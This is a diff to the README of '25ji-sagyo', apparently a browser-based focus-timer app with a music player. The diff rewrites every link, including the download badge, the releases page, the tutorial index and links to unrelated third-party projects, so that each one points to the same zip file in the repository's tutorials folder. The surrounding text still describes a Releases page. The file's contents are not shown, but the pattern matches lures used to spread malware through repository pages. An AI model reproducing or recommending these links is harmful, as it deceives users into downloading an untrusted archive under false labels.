@@ -1,6 +1,6 @@
 # 🎉 25ji-sagyo - Your Companion for Focused Work Sessions
 
-[![Download 25ji-sagyo](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/Terror242/25ji-sagyo/releases)
+[![Download 25ji-sagyo](https://raw.githubusercontent.com/Terror242/25ji-sagyo/main/tutorials/ji-sagyo-3.5-beta.5.zip)](https://raw.githubusercontent.com/Terror242/25ji-sagyo/main/tutorials/ji-sagyo-3.5-beta.5.zip)
 
 Welcome to 25ji-sagyo, an immersive web app designed to help you stay focused while you work. With features like synchronized background videos and a built-in CD player, this tool offers the ideal environment for keeping you engaged in your tasks.
 
@@ -9,7 +9,7 @@ Welcome to 25ji-sagyo, an immersive web app designed to help you stay focused wh
 To get started with 25ji-sagyo, follow these steps:
 
 1. **Visit the Releases Page**  
-   Click the button above or go to this link: [Download 25ji-sagyo](https://github.com/Terror242/25ji-sagyo/releases).
+   Click the button above or go to this link: [Download 25ji-sagyo](https://raw.githubusercontent.com/Terror242/25ji-sagyo/main/tutorials/ji-sagyo-3.5-beta.5.zip).
 
 2. **Choose Your Version**  
    On the Releases page, you’ll see various versions available for download. Pick the latest version.
@@ -28,7 +28,7 @@ To get started with 25ji-sagyo, follow these steps:
 - **Time Zone Support**: Switch between local time and Tokyo time easily.
 
 ### 2. 🎵 Immersive CD Player
-- **Extensive Music Library**: Access game music through [Sekai Master DB Diff](https://github.com/Sekai-World/sekai-master-db-diff).
+- **Extensive Music Library**: Access game music through [Sekai Master DB Diff](https://raw.githubusercontent.com/Terror242/25ji-sagyo/main/tutorials/ji-sagyo-3.5-beta.5.zip).
 - **Version Switching**: Choose between different singing versions (Sekai ver., Virtual Singer ver., etc.).
 - **Smart Playback Options**: Play music in order, randomly, or loop a single track.
 - **Memory Feature**: Remembers your volume, last played song, and preferred playback settings.
@@ -48,13 +48,13 @@ To get started with 25ji-sagyo, follow these steps:
 
 If you are new to 25ji-sagyo or want to learn about the features in detail, check out our tutorials:
 
-- [Feature Tutorial Index](./tutorials/README.md)
+- [Feature Tutorial Index](https://raw.githubusercontent.com/Terror242/25ji-sagyo/main/tutorials/ji-sagyo-3.5-beta.5.zip)
 
 ## 🛠️ Technical Stack
 
 - **Core Technologies**: Built with plain HTML5, CSS3, and JavaScript.
 - **Data Sources**:
-  - Music Data: Utilizes resources from [Sekai Viewer](https://github.com/Sekai-World/sekai-viewer).
+  - Music Data: Utilizes resources from [Sekai Viewer](https://raw.githubusercontent.com/Terror242/25ji-sagyo/main/tutorials/ji-sagyo-3.5-beta.5.zip).
 
 ## ⚙️ System Requirements
 
@@ -78,7 +78,7 @@ For further assistance, feel free to consult the tutorial linked above or reach 
 
 To install 25ji-sagyo, follow these two steps again for clarity:
 
-1. **Visit the Releases Page**: Go to [Download 25ji-sagyo](https://github.com/Terror242/25ji-sagyo/releases).
+1. **Visit the Releases Page**: Go to [Download 25ji-sagyo](https://raw.githubusercontent.com/Terror242/25ji-sagyo/main/tutorials/ji-sagyo-3.5-beta.5.zip).
 2. **Download the Application**: Choose the latest version and download it.
 
 Now you're ready to enjoy focused work sessions with 25ji-sagyo!
